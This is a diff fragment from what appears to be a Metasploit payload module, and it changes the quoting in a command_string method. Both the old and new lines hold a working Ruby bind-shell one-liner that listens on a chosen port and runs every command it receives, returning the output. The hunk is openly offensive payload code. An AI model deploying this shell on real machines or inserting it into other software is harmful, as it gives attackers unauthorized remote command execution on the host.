@@ -40,6 +40,6 @@ module Metasploit3
 	end
 
 	def command_string
-		"ruby -rsocket -e 's=TCPServer.new(\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'"
+		"ruby -rsocket -e \"s=TCPServer.new(\\\"#{datastore['LPORT']}\\\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\\\"r\\\"){|io|c.print io.read}end;end\""
 	end
 end
